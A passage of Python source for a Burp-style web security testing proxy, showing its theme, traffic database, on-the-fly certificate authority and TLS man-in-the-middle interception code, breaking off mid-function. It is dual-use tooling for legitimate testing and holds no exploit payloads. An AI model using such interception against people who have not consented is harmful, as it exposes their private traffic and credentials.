#!/usr/bin/env python3
"""
Kingception v1.0 – Professional HTTP Security Suite (Burp‑style)
- Proxy starts automatically on 127.0.0.1:8080
- Request intercept only (no response intercept)
- Rich right‑click menu in Intercept tab
- Repeater with live Content‑Length calculation
- Full Intruder, Scanner, Discovery, Comparer, JWT, Decoder, Dashboard
"""

import sys
import json
import threading
import ssl
import sqlite3
import uuid
import time
import re
import os
import socket
import gzip
import zlib
import base64
import datetime
import ipaddress
import csv
import io
import hashlib
import importlib.util
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from collections import deque, defaultdict, Counter
from itertools import product as iterproduct
from urllib.parse import urlparse, quote as url_quote, unquote as url_unquote
import concurrent.futures
import webbrowser
import textwrap
import http.client

# PyQt6
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QTabWidget, QTreeWidget, QTreeWidgetItem, QTextEdit, QPushButton,
    QLineEdit, QComboBox, QLabel, QSplitter, QTableWidget, QTableWidgetItem,
    QHeaderView, QMenu, QMessageBox, QInputDialog, QFileDialog, QCheckBox,
    QToolBar, QStatusBar, QProgressBar, QListWidget, QListWidgetItem,
    QGroupBox, QSpinBox, QDialog, QFormLayout, QDialogButtonBox,
    QAbstractItemView, QPlainTextEdit, QScrollArea
)
from PyQt6.QtGui import (
    QFont, QColor, QBrush, QTextCursor, QTextCharFormat,
    QSyntaxHighlighter, QTextDocument, QPainter, QPen, QPainterPath,
    QLinearGradient
)
from PyQt6.QtCore import (
    Qt, QThread, pyqtSignal, QTimer, QSettings, QObject,
    QPointF
)

# Optional dependencies
HAS_REQUESTS = HAS_CRYPTO = HAS_JWT = HAS_BROTLI = HAS_BS4 = False
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    pass
try:
    from cryptography import x509
    from cryptography.x509.oid import NameOID, ExtendedKeyUsageOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.backends import default_backend
    HAS_CRYPTO = True
except ImportError:
    pass
try:
    import jwt as pyjwt
    HAS_JWT = True
except ImportError:
    pass
try:
    import brotli
    HAS_BROTLI = True
except ImportError:
    pass
try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    pass

# ========== THEME ENGINE (dark / light) ==========
_DARK_MODE = True   # toggle via Settings

class _ThemeLight:
    BG     = "#f8fafc"; PANEL  = "#ffffff"; CARD   = "#ffffff"
    SURFACE= "#f1f5f9"; BORDER = "#e2e8f0"; GLOW   = "#cbd5e1"
    BLUE   = "#2563eb"; PURPLE = "#7c3aed"; CYAN   = "#0891b2"
    GREEN  = "#059669"; YELLOW = "#d97706"; RED    = "#dc2626"; PINK = "#db2777"
    TXT1   = "#0f172a"; TXT2   = "#334155"; TXT3   = "#64748b"; CODE = "#1e293b"
    ADD_GREEN = "#d1fae5"; DEL_RED = "#fee2e2"; SAME_BG = "#f8fafc"
    MONO = "JetBrains Mono, Fira Code, Consolas, monospace"
    UI   = "Inter, Segoe UI, system-ui, sans-serif"

class _ThemeDark:
    BG     = "#0e1016"; PANEL  = "#13151c"; CARD   = "#13151c"
    SURFACE= "#1a1d27"; BORDER = "#252836"; GLOW   = "#343848"
    BLUE   = "#4d8eff"; PURPLE = "#9b72e8"; CYAN   = "#2ec4b6"
    GREEN  = "#3dd68c"; YELLOW = "#f0a347"; RED    = "#f45c5c"; PINK   = "#e87299"
    TXT1   = "#e0e4f0"; TXT2   = "#8891ab"; TXT3   = "#515971"; CODE   = "#c8d0e8"
    ADD_GREEN = "#1a3828"; DEL_RED = "#38181a"; SAME_BG = "#0e1016"
    MONO = "JetBrains Mono, Cascadia Code, Fira Code, Consolas, monospace"
    UI   = "Inter, SF Pro Text, Segoe UI, system-ui, sans-serif"

T: _ThemeDark = _ThemeDark()   # default dark; reassigned by toggle

def _make_css() -> str:
    bg=T.BG; pn=T.PANEL; sf=T.SURFACE; bd=T.BORDER; gw=T.GLOW
    bl=T.BLUE; rd=T.RED; gn=T.GREEN; yn=T.YELLOW; cy=T.CYAN; pu=T.PURPLE
    t1=T.TXT1; t2=T.TXT2; t3=T.TXT3; cd=T.CODE; mn=T.MONO; ui=T.UI
    btn_txt = '#e6edf3' if _DARK_MODE else '#ffffff'
    return f"""
/* ── Base ── */
QWidget{{background:{bg};color:{t1};font-family:{ui};font-size:13px;border:none;outline:none;}}
QMainWindow{{background:{bg};}}
QDialog{{background:{bg};border:1px solid {bd};border-radius:10px;}}

/* ── Scrollbars ── */
QScrollBar:vertical{{background:{sf};width:7px;border-radius:3px;margin:0;}}
QScrollBar::handle:vertical{{background:{gw};border-radius:3px;min-height:24px;}}
QScrollBar::handle:vertical:hover{{background:{bl};}}
QScrollBar::add-line:vertical,QScrollBar::sub-line:vertical{{height:0;}}
QScrollBar:horizontal{{background:{sf};height:7px;border-radius:3px;margin:0;}}
QScrollBar::handle:horizontal{{background:{gw};border-radius:3px;min-width:24px;}}
QScrollBar::handle:horizontal:hover{{background:{bl};}}
QScrollBar::add-line:horizontal,QScrollBar::sub-line:horizontal{{width:0;}}

/* ── Toolbar ── */
QToolBar{{background:{pn};border-bottom:1px solid {bd};padding:4px 10px;spacing:4px;}}
QToolBar::separator{{background:{bd};width:1px;margin:4px 6px;}}

/* ── Status bar ── */
QStatusBar{{background:{pn};border-top:1px solid {bd};color:{t2};font-size:11px;padding:2px 10px;}}
QStatusBar::item{{border:none;}}

/* ── Main Tab Bar ── */
QTabWidget::pane{{background:{bg};border:none;}}
QTabBar{{background:{pn};border-bottom:1px solid {bd};}}
QTabBar::tab{{
    background:{pn};color:{t3};
    padding:9px 16px;font-size:12px;font-weight:500;
    border:none;border-bottom:2px solid transparent;
    margin-right:1px;min-width:70px;
}}
QTabBar::tab:selected{{color:{bl};border-bottom:2px solid {bl};background:{bg};font-weight:600;}}
QTabBar::tab:hover:!selected{{color:{t1};background:{sf};}}
QTabBar::tab:disabled{{color:{gw};}}
QTabBar::close-button{{subcontrol-position:right;}}

/* ── Tables / Trees ── */
QTreeWidget,QTableWidget{{
    background:{pn};alternate-background-color:{sf};
    border:1px solid {bd};border-radius:6px;
    gridline-color:{bd};
    selection-background-color:{bl}28;selection-color:{t1};
    outline:none;
}}
QTreeWidget::item,QTableWidget::item{{padding:5px 8px;border:none;}}
QTreeWidget::item:hover,QTableWidget::item:hover{{background:{sf};}}
QTreeWidget::item:selected,QTableWidget::item:selected{{background:{bl}28;color:{t1};}}
QHeaderView::section{{
    background:{sf};color:{t2};
    padding:5px 10px;border:none;
    border-right:1px solid {bd};border-bottom:1px solid {bd};
    font-size:11px;font-weight:600;
}}
QHeaderView::section:first{{border-radius:6px 0 0 0;}}

/* ── Text editors ── */
QPlainTextEdit,QTextEdit{{
    background:{pn};color:{cd};
    border:1px solid {bd};border-radius:6px;
    padding:6px;font-family:{mn};font-size:12px;
    selection-background-color:{bl}44;
}}
QPlainTextEdit:focus,QTextEdit:focus{{border-color:{bl}88;}}

/* ── Line edit ── */
QLineEdit{{
    background:{sf};color:{t1};
    border:1px solid {bd};border-radius:6px;
    padding:5px 10px;
}}
QLineEdit:focus{{border-color:{bl};background:{pn};}}
QLineEdit:hover{{border-color:{gw};}}

/* ── ComboBox ── */
QComboBox{{
    background:{sf};color:{t1};
    border:1px solid {bd};border-radius:6px;
    padding:4px 8px;
}}
QComboBox:focus{{border-color:{bl};}}
QComboBox::drop-down{{border:none;width:20px;}}
QComboBox::down-arrow{{width:10px;height:10px;}}
QComboBox QAbstractItemView{{
    background:{pn};border:1px solid {bd};border-radius:6px;
    selection-background-color:{bl}33;outline:none;
}}

/* ── Buttons ── */
QPushButton{{
    background:{sf};color:{t1};
    border:1px solid {bd};border-radius:6px;
    padding:6px 14px;font-weight:500;
    min-height:28px;
}}
QPushButton:hover{{background:{bd};border-color:{gw};}}
QPushButton:pressed{{background:{gw};}}
QPushButton:disabled{{color:{gw};border-color:{bd};background:{sf};}}
QPushButton#primary{{background:{bl};color:{btn_txt};border:none;font-weight:600;}}
QPushButton#primary:hover{{background:{cy};color:#0d1117;}}
QPushButton#primary:pressed{{background:{pu};}}
QPushButton#primary:disabled{{background:{gw};color:{t3};}}
QPushButton#danger{{background:transparent;color:{rd};border:1px solid {rd}44;}}
QPushButton#danger:hover{{background:{rd}18;border-color:{rd};}}
QPushButton#success{{background:transparent;color:{gn};border:1px solid {gn}44;}}
QPushButton#success:hover{{background:{gn}18;border-color:{gn};}}
QPushButton#flat{{background:transparent;border:none;color:{t2};}}
QPushButton#flat:hover{{background:{sf};color:{t1};}}

/* ── CheckBox ── */
QCheckBox{{color:{t2};spacing:7px;font-size:12px;}}
QCheckBox::indicator{{width:15px;height:15px;border-radius:4px;border:1px solid {gw};background:{sf};}}
QCheckBox::indicator:checked{{background:{bl};border-color:{bl};image:none;}}
QCheckBox::indicator:hover{{border-color:{bl};}}

/* ── GroupBox ── */
QGroupBox{{border:1px solid {bd};border-radius:8px;margin-top:18px;padding-top:14px;font-weight:600;color:{t2};}}
QGroupBox::title{{subcontrol-origin:margin;left:10px;padding:0 6px;font-size:11px;}}

/* ── ProgressBar ── */
QProgressBar{{background:{sf};border:1px solid {bd};border-radius:4px;height:5px;text-align:center;font-size:9px;color:transparent;}}
QProgressBar::chunk{{background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 {bl},stop:1 {cy});border-radius:4px;}}

/* ── Splitter ── */
QSplitter::handle{{background:{bd};}}
QSplitter::handle:horizontal{{width:2px;}}
QSplitter::handle:vertical{{height:2px;}}
QSplitter::handle:hover{{background:{bl};}}

/* ── Menu ── */
QMenu{{background:{pn};border:1px solid {bd};border-radius:8px;padding:4px;}}
QMenu::item{{padding:7px 20px 7px 12px;border-radius:5px;font-size:12px;}}
QMenu::item:selected{{background:{sf};color:{t1};}}
QMenu::separator{{background:{bd};height:1px;margin:4px 8px;}}

/* ── SpinBox ── */
QSpinBox{{background:{sf};color:{t1};border:1px solid {bd};border-radius:6px;padding:4px 8px;}}
QSpinBox:focus{{border-color:{bl};}}

/* ── Tooltips ── */
QToolTip{{background:{pn};color:{t1};border:1px solid {bd};border-radius:6px;padding:6px 10px;font-size:11px;}}

/* ── ScrollArea ── */
QScrollArea{{border:none;}}

/* ── FormLayout labels ── */
QLabel{{color:{t2};font-size:12px;background:transparent;}}
"""

CSS = _make_css()

def method_color(m: str) -> str:
    return {"GET": _ThemeDark.GREEN, "POST": _ThemeDark.YELLOW, "PUT": _ThemeDark.BLUE,
            "DELETE": _ThemeDark.RED, "PATCH": _ThemeDark.PURPLE,
            "HEAD": _ThemeDark.CYAN, "OPTIONS": _ThemeDark.TXT3}.get(m.upper(), _ThemeDark.TXT2)

def status_color(c) -> str:
    try: c = int(c)
    except Exception: return _ThemeDark.TXT2
    if 200 <= c < 300: return _ThemeDark.GREEN
    if 300 <= c < 400: return _ThemeDark.CYAN
    if 400 <= c < 500: return _ThemeDark.YELLOW
    if c >= 500: return _ThemeDark.RED
    return _ThemeDark.TXT2

# Aliases so existing T.method / T.status calls still resolve cleanly
# (they are just module-level functions — no instance binding)
_ThemeDark.method  = staticmethod(lambda m: method_color(m))
_ThemeDark.status  = staticmethod(lambda c: status_color(c))
_ThemeLight.method = staticmethod(lambda m: method_color(m))
_ThemeLight.status = staticmethod(lambda c: status_color(c))



# ========== UTILITIES ==========
def safe_json(data, default=None):
    if default is None:
        default = {}
    try:
        if isinstance(data, (bytes, bytearray)):
            data = data.decode('utf-8', 'replace')
        if isinstance(data, str):
            return json.loads(data)
        return data if data is not None else default
    except Exception:
        return default

def jdump(data):
    try:
        return json.dumps(data, default=str)
    except Exception:
        return str(data)

def decode_body(body):
    if body is None:
        return ""
    if isinstance(body, str):
        return body
    try:
        return body.decode('utf-8', 'replace')
    except Exception:
        return repr(body)

def decompress(body: bytes, enc: str) -> bytes:
    try:
        if 'gzip' in enc:
            return gzip.decompress(body)
        if 'deflate' in enc:
            return zlib.decompress(body)
        if 'br' in enc and HAS_BROTLI:
            return brotli.decompress(body)
    except Exception:
        pass
    return body

def pretty_size(n: int) -> str:
    for unit in ['B', 'KB', 'MB', 'GB']:
        if n < 1024:
            return f"{n:.0f} {unit}"
        n /= 1024
    return f"{n:.1f} TB"

def mono_font(size=10):
    f = QFont()
    f.setFamily(T.MONO.split(',')[0].strip())
    f.setPointSize(size)
    return f

# ========== DATABASE ==========
class DB:
    def __init__(self, path="kingception.db"):
        self.path = path
        self.lock = threading.Lock()
        self.cache = {}
        self.recent = deque(maxlen=10000)
        self._init()

    def _init(self):
        with sqlite3.connect(self.path) as c:
            c.execute("PRAGMA journal_mode=WAL")
            c.execute("PRAGMA synchronous=NORMAL")
            c.executescript("""
                CREATE TABLE IF NOT EXISTS messages(
                    id TEXT PRIMARY KEY, url TEXT, method TEXT, host TEXT, port INTEGER,
                    path TEXT, scheme TEXT, req_headers TEXT, req_body BLOB,
                    resp_headers TEXT, resp_body BLOB, status INTEGER,
                    ts REAL, dur REAL, tags TEXT, notes TEXT, color TEXT,
                    content_type TEXT, resp_size INTEGER, source_ip TEXT
                );
                CREATE TABLE IF NOT EXISTS match_rules(
                    id TEXT PRIMARY KEY, name TEXT, pattern TEXT, replace TEXT,
                    apply_to TEXT, scope TEXT, enabled INTEGER, is_regex INTEGER
                );
                CREATE TABLE IF NOT EXISTS scan_results(
                    id TEXT PRIMARY KEY, url TEXT, vuln_type TEXT, severity TEXT,
                    desc TEXT, req_ev TEXT, resp_ev TEXT, fix TEXT, cwe TEXT,
                    cvss REAL, ts REAL, confidence TEXT
                );
                CREATE TABLE IF NOT EXISTS auto_responders(
                    id TEXT PRIMARY KEY, match TEXT, status INTEGER, body TEXT, headers TEXT,
                    enabled INTEGER, is_regex INTEGER
                );
                CREATE INDEX IF NOT EXISTS idx_ts ON messages(ts DESC);
                CREATE INDEX IF NOT EXISTS idx_host ON messages(host);
                CREATE INDEX IF NOT EXISTS idx_status ON messages(status);
            """)

    def save_msg(self, m: dict):
        with self.lock:
            self.cache[m['id']] = m
            # IMPORTANT: store the full dict, not just the ID.
            # Every consumer (_export_har, _export_json, _export_csv,
            # _export_curl, _quick_export, _analysis_tab) iterates this
            # deque calling m.get(...) on each entry — pushing a bare ID
            # string here caused AttributeError: 'str' object has no
            # attribute 'get' on every live-captured request.
            self.recent.appendleft(m)
            try:
                with sqlite3.connect(self.path) as c:
                    c.execute("""INSERT OR REPLACE INTO messages VALUES
                        (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""", (
                        m['id'], m['url'], m['method'], m['host'], m.get('port', 80),
                        m.get('path', '/'), m.get('scheme', 'http'),
                        jdump(m.get('req_headers', {})), m.get('req_body'),
                        jdump(m.get('resp_headers', {})), m.get('resp_body'),
                        m.get('status', 0), m.get('ts', time.time()), m.get('dur', 0),
                        jdump(m.get('tags', [])), m.get('notes', ''), m.get('color', ''),
                        m.get('content_type', ''), m.get('resp_size', 0),
                        m.get('source_ip', '')
                    ))
            except Exception as e:
                print(f"[DB] {e}")

    def get_msg(self, mid: str) -> Optional[dict]:
        if mid in self.cache:
            return self.cache[mid]
        try:
            with sqlite3.connect(self.path) as c:
                c.row_factory = sqlite3.Row
                r = c.execute("SELECT * FROM messages WHERE id=?", (mid,)).fetchone()
                if r:
                    d = dict(r)
                    self.cache[mid] = d
                    return d
        except Exception:
            pass
        return None

    def list_msgs(self, limit=1000, method=None, status_f=None, search=None, host=None) -> List[dict]:
        q = "SELECT id,url,method,status,resp_size,dur,ts,host,path FROM messages WHERE 1=1"
        p = []
        if method and method != "All":
            q += " AND method=?"
            p.append(method)
        if host:
            q += " AND host LIKE ?"
            p.append(f"%{host}%")
        if status_f and status_f != "All":
            lo = int(status_f[0]) * 100
            hi = lo + 100
            q += " AND status>=? AND status<?"
            p += [lo, hi]
        if search:
            q += " AND (url LIKE ? OR host LIKE ?)"
            p += [f"%{search}%"] * 2
        q += " ORDER BY ts DESC LIMIT ?"
        p.append(limit)
        try:
            with sqlite3.connect(self.path) as c:
                c.row_factory = sqlite3.Row
                return [dict(r) for r in c.execute(q, p).fetchall()]
        except Exception:
            return []

    def hosts(self) -> List[Tuple[str, int]]:
        try:
            with sqlite3.connect(self.path) as c:
                rows = c.execute("""
                    SELECT host, COUNT(*) cnt FROM messages
                    GROUP BY host ORDER BY cnt DESC LIMIT 200
                """).fetchall()
                return [(r[0], r[1]) for r in rows]
        except Exception:
            return []

    def stats(self) -> dict:
        try:
            with sqlite3.connect(self.path) as c:
                total = c.execute("SELECT COUNT(*) FROM messages").fetchone()[0]
                hosts = c.execute("SELECT COUNT(DISTINCT host) FROM messages").fetchone()[0]
                scans = c.execute("SELECT COUNT(*) FROM scan_results").fetchone()[0]
                top = c.execute("SELECT host, COUNT(*) cnt FROM messages GROUP BY host ORDER BY cnt DESC LIMIT 10").fetchall()
                statuses = c.execute("SELECT status//100 * 100 as sc, COUNT(*) cnt FROM messages GROUP BY sc").fetchall()
                methods = c.execute("SELECT method, COUNT(*) cnt FROM messages GROUP BY method ORDER BY cnt DESC").fetchall()
                return {
                    'total': total,
                    'hosts': hosts,
                    'scans': scans,
                    'top_hosts': top,
                    'statuses': {f"{s[0]}": s[1] for s in statuses},
                    'methods': dict(methods)
                }
        except Exception:
            return {}

    def clear(self):
        with self.lock:
            self.cache.clear()
            self.recent.clear()
            with sqlite3.connect(self.path) as c:
                c.execute("DELETE FROM messages")

    def save_rule(self, r):
        with sqlite3.connect(self.path) as c:
            c.execute("INSERT OR REPLACE INTO match_rules VALUES(?,?,?,?,?,?,?,?)",
                      (r.id, r.name, r.pattern, r.replace, r.apply_to, r.scope, int(r.enabled), int(r.is_regex)))

    def load_rules(self) -> List:
        try:
            with sqlite3.connect(self.path) as c:
                c.row_factory = sqlite3.Row
                rows = c.execute("SELECT * FROM match_rules").fetchall()
                rules = []
                for r in rows:
                    @dataclass
                    class MRule:
                        id: str; name: str; pattern: str; replace: str
                        apply_to: str; scope: str; enabled: bool; is_regex: bool
                    rules.append(MRule(r['id'], r['name'], r['pattern'], r['replace'],
                                       r['apply_to'], r['scope'], bool(r['enabled']), bool(r['is_regex'])))
                return rules
        except Exception:
            return []

    def save_scan(self, r: dict):
        with sqlite3.connect(self.path) as c:
            c.execute("INSERT OR REPLACE INTO scan_results VALUES(?,?,?,?,?,?,?,?,?,?,?,?)",
                      (r['id'], r['url'], r.get('vuln_type', ''), r.get('severity', ''),
                       r.get('desc', ''), r.get('req_ev', ''), r.get('resp_ev', ''),
                       r.get('fix', ''), r.get('cwe', ''), r.get('cvss', 0),
                       r.get('ts', time.time()), r.get('confidence', 'medium')))

    def list_scans(self) -> list:
        try:
            with sqlite3.connect(self.path) as c:
                c.row_factory = sqlite3.Row
                return [dict(r) for r in c.execute("SELECT * FROM scan_results ORDER BY ts DESC").fetchall()]
        except Exception:
            return []

    def save_responder(self, r):
        with sqlite3.connect(self.path) as c:
            c.execute("INSERT OR REPLACE INTO auto_responders VALUES(?,?,?,?,?,?,?)",
                      (r.id, r.match, r.status, r.body, r.headers, int(r.enabled), int(r.is_regex)))

    def load_responders(self) -> list:
        try:
            with sqlite3.connect(self.path) as c:
                c.row_factory = sqlite3.Row
                rows = c.execute("SELECT * FROM auto_responders").fetchall()
                @dataclass
                class ARule:
                    id: str; match: str; status: int; body: str; headers: str
                    enabled: bool; is_regex: bool
                return [ARule(r['id'], r['match'], r['status'], r['body'], r['headers'],
                              bool(r['enabled']), bool(r['is_regex'])) for r in rows]
        except Exception:
            return []

    def sitemap(self) -> dict:
        try:
            with sqlite3.connect(self.path) as c:
                rows = c.execute("SELECT host, path, method FROM messages").fetchall()
                sm = defaultdict(lambda: defaultdict(set))
                for host, path, method in rows:
                    clean = (path or '/').split('?')[0]
                    sm[host][clean].add(method)
                return {h: {p: list(m) for p, m in paths.items()} for h, paths in sm.items()}
        except Exception:
            return {}

# ========== CERTIFICATE MANAGER ==========
class CertManager:
    def __init__(self):
        self.base = Path.home() / 'kingception'          # NO leading dot
        self.base.mkdir(exist_ok=True)
        self.cert_dir = self.base / 'certs'
        self.cert_dir.mkdir(exist_ok=True)
        self.ca_crt = self.base / 'kingception-ca.crt'   # renamed
        self.ca_key = self.base / 'kingception-ca.key'   # renamed
        self._ca_cert = None
        self._ca_key = None
        self._host_cache = {}
        self._load_ca()

    def _load_ca(self) -> bool:
        if not HAS_CRYPTO:
            return False
        if self.ca_crt.exists() and self.ca_key.exists():
            try:
                with open(self.ca_crt, 'rb') as f:
                    self._ca_cert = x509.load_pem_x509_certificate(f.read(), default_backend())
                with open(self.ca_key, 'rb') as f:
                    self._ca_key = serialization.load_pem_private_key(f.read(), password=None, backend=default_backend())
                return True
            except Exception:
                pass
        return False

    def has_ca(self) -> bool:
        return self._ca_cert is not None

    def generate_ca(self) -> Tuple[str, str]:
        if not HAS_CRYPTO:
            raise RuntimeError("Install cryptography: pip install cryptography")
        key = rsa.generate_private_key(public_exponent=65537, key_size=4096, backend=default_backend())
        name = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Kingception Security Suite"),
            x509.NameAttribute(NameOID.COMMON_NAME, "Kingception Root CA"),
        ])
        # Backdate by 1 day to absorb client/server clock skew — without this,
        # a machine whose clock is even slightly ahead of the generating
        # machine will see "certificate not yet valid" TLS errors.
        now = datetime.datetime.now(datetime.timezone.utc).replace(tzinfo=None) \
              - datetime.timedelta(days=1)
        cert = (x509.CertificateBuilder()
                .subject_name(name)
                .issuer_name(name)
                .public_key(key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(now)
                .not_valid_after(now + datetime.timedelta(days=3650))
                .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)
                .add_extension(x509.KeyUsage(digital_signature=True, key_cert_sign=True, crl_sign=True,
                                             content_commitment=False, key_encipherment=False,
                                             data_encipherment=False, key_agreement=False,
                                             encipher_only=False, decipher_only=False), critical=True)
                .add_extension(x509.SubjectKeyIdentifier.from_public_key(key.public_key()), critical=False)
                .sign(key, hashes.SHA256(), default_backend()))
        with open(self.ca_crt, 'wb') as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
        with open(self.ca_key, 'wb') as f:
            f.write(key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
                                      serialization.NoEncryption()))
        self._ca_cert = cert
        self._ca_key = key
        return str(self.ca_crt), str(self.ca_key)

    def get_host_cert(self, hostname: str) -> Tuple[str, str]:
        if hostname in self._host_cache:
            return self._host_cache[hostname]
        safe = re.sub(r'[^a-zA-Z0-9._\-]', '_', hostname)
        crt = self.cert_dir / f"{safe}.crt"
        key = self.cert_dir / f"{safe}.key"
        # Check BOTH files — a half-written pair (e.g. crt present, key
        # missing after a manual delete or crash mid-write) must regenerate,
        # not silently hand back a cert with no matching private key.
        if not (crt.exists() and key.exists()):
            self._gen_host(hostname, crt, key)
        pair = (str(crt), str(key))
        self._host_cache[hostname] = pair
        return pair

    def _gen_host(self, hostname: str, crt_path: Path, key_path: Path):
        key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
        name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, hostname)])
        # Backdate by 1 day — same clock-skew rationale as the root CA above
        now = datetime.datetime.now(datetime.timezone.utc).replace(tzinfo=None) \
              - datetime.timedelta(days=1)
        try:
            san = x509.SubjectAlternativeName([x509.IPAddress(ipaddress.ip_address(hostname))])
        except Exception:
            san = x509.SubjectAlternativeName([x509.DNSName(f"*.{hostname}"), x509.DNSName(hostname)])
        cert = (x509.CertificateBuilder()
                .subject_name(name)
                .issuer_name(self._ca_cert.subject)
                .public_key(key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(now)
                .not_valid_after(now + datetime.timedelta(days=825))
                .add_extension(san, critical=False)
                .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
                # Required by modern browsers/TLS stacks — without this, some
                # clients reject the leaf cert even though the root CA is trusted.
                .add_extension(
                    x509.ExtendedKeyUsage([ExtendedKeyUsageOID.SERVER_AUTH]),
                    critical=False)
                .add_extension(
                    x509.KeyUsage(digital_signature=True, key_encipherment=True,
                                 content_commitment=False, data_encipherment=False,
                                 key_agreement=False, key_cert_sign=False, crl_sign=False,
                                 encipher_only=False, decipher_only=False),
                    critical=True)
                .sign(self._ca_key, hashes.SHA256(), default_backend()))
        with open(crt_path, 'wb') as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
        with open(key_path, 'wb') as f:
            f.write(key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption()))

# ========== INTERCEPT MANAGER (REQUEST ONLY) ==========
@dataclass
class PendingItem:
    mid: str
    method: str
    url: str
    headers: dict
    body: Optional[bytes]
    event: threading.Event = field(default_factory=threading.Event)
    modified_headers: Optional[dict] = None
    modified_body: Optional[bytes] = None
    dropped: bool = False
    # True once forward() has been called — distinguishes "not yet forwarded"
    # from "forwarded with an explicitly-empty/None body"
    forwarded: bool = False

class InterceptMgr(QObject):
    req_captured = pyqtSignal(object)

    def __init__(self):
        super().__init__()
        self.enabled = False
        self._lock = threading.Lock()
        self._pending: Dict[str, PendingItem] = {}

    def toggle(self, on: bool):
        self.enabled = on
        if not on:
            self._release_all()

    def _release_all(self):
        with self._lock:
            for pi in list(self._pending.values()):
                if not pi.event.is_set():
                    pi.dropped = False
                    pi.event.set()

    def hold_request(self, mid, url, method, headers, body) -> Optional[PendingItem]:
        pi = PendingItem(mid=mid, method=method, url=url, headers=headers, body=body)
        with self._lock:
            self._pending[mid] = pi
        self.req_captured.emit(pi)
        pi.event.wait(timeout=300)
        with self._lock:
            self._pending.pop(mid, None)
        return None if pi.dropped else pi

    def forward(self, key: str, headers=None, body=None):
        with self._lock:
            pi = self._pending.get(key)
        if pi:
            pi.modified_headers = headers
            pi.modified_body = body
            pi.forwarded = True
            pi.dropped = False
            pi.event.set()

    def drop(self, key: str):
        with self._lock:
            pi = self._pending.get(key)
        if pi:
            pi.dropped = True
            pi.event.set()

    def pending_count(self) -> int:
        with self._lock:
            return sum(1 for p in self._pending.values() if not p.event.is_set())

# ========== PROXY CONNECTION ==========
class ProxyConn(threading.Thread):
    def __init__(self, csock, caddr, proxy):
        super().__init__(daemon=True)
        self.csock = csock
        self.caddr = caddr
        self.proxy = proxy

    def run(self):
        try:
            first = self._readline(self.csock)
            if not first:
                return
            parts = first.split()
            if len(parts) < 2:
                return
            if parts[0].upper() == 'CONNECT':
                self._handle_connect(parts[1])
            else:
                self._handle_plain(first)
        except Exception:
            pass
        finally:
            try:
                self.csock.close()
            except Exception:
                pass

    def _readline(self, s) -> str:
        buf = b''
        while True:
            try:
                ch = s.recv(1)
            except Exception:
                break
            if not ch:
                break
            if ch == b'\n':
                break
            buf += ch
        return buf.decode('utf-8', 'replace').rstrip('\r\n')

    def _read_headers(self, s) -> dict:
        h = {}
        while True:
            line = self._readline(s)
            if not line:
                break
            if ':' in line:
                k, v = line.split(':', 1)
                h[k.strip()] = v.strip()
        return h

    def _read_body(self, s, headers: dict) -> bytes:
        # Handle chunked transfer encoding
        te = headers.get('Transfer-Encoding', headers.get('transfer-encoding', '')).lower()
        if 'chunked' in te:
            return self._read_chunked(s)
        cl = int(headers.get('Content-Length', headers.get('content-length', 0)))
        if cl <= 0:
            return b''
        chunks = []
        rem = cl
        while rem > 0:
            try:
                d = s.recv(min(rem, 16384))
                if not d:
                    break
                chunks.append(d)
                rem -= len(d)
            except Exception:
                break
        return b''.join(chunks)

    def _read_chunked(self, s) -> bytes:
        """Read a chunked HTTP body."""
        body = b''
        try:
            while True:
                size_line = self._readline(s).strip()
                if not size_line:
                    size_line = self._readline(s).strip()
                chunk_size = int(size_line.split(';')[0], 16)
                if chunk_size == 0:
                    self._readline(s)
                    break
                data = b''
                while len(data) < chunk_size:
                    d = s.recv(min(chunk_size - len(data), 16384))
                    if not d:
                        break
                    data += d
                body += data
                self._readline(s)
        except Exception:
            pass
        return body

    def _handle_connect(self, target: str):
        host, port = target.rsplit(':', 1) if ':' in target else (target, '443')
        port = int(port)
        # consume CONNECT headers
        while self._readline(self.csock):
            pass
        self.csock.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")

        if not self.proxy.certs.has_ca():
            self._tunnel(host, port)
            return

        try:
            crt, key_f = self.proxy.certs.get_host_cert(host)
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(crt, key_f)
            ctx.minimum_version = ssl.TLSVersion.TLSv1_2
            # ── CRITICAL: advertise only HTTP/1.1 via ALPN ──────────────────
            # Without this, Chrome/Firefox negotiate h2 (HTTP/2) inside the
            # tunnel, the proxy gets binary frames, parse fails, body = nothing.
            try:
                ctx.set_alpn_protocols(['http/1.1'])
            except AttributeError:
                pass  # older Python builds — still works, browser falls back
            client_tls = ctx.wrap_socket(self.csock, server_side=True)
        except ssl.SSLError as e:
            try: self.csock.close()
            except Exception: pass
            return
        except Exception:
            self._tunnel(host, port)
            return

        try:
            self._http_stream(client_tls, host, port, 'https')
        finally:
            try:
                client_tls.close()
            except Exception:
                pass

    def _tunnel(self, host: str, port: int):
        try:
            rsock = socket.create_connection((host, port), timeout=15)
            def relay(src, dst):
                try:
                    while True:
                        d = src.recv(8192)
                        if not d:
                            break
                        dst.sendall(d)
                except Exception:
                    pass
                try:
                    dst.close()
                except Exception:
                    pass
            threading.Thread(target=relay, args=(rsock, self.csock), daemon=True).start()
            relay(self.csock, rsock)
        except Exception:
            pass

    def _handle_plain(self, first: str):
        parts = first.split()
        method = parts[0].upper()
        url = parts[1]
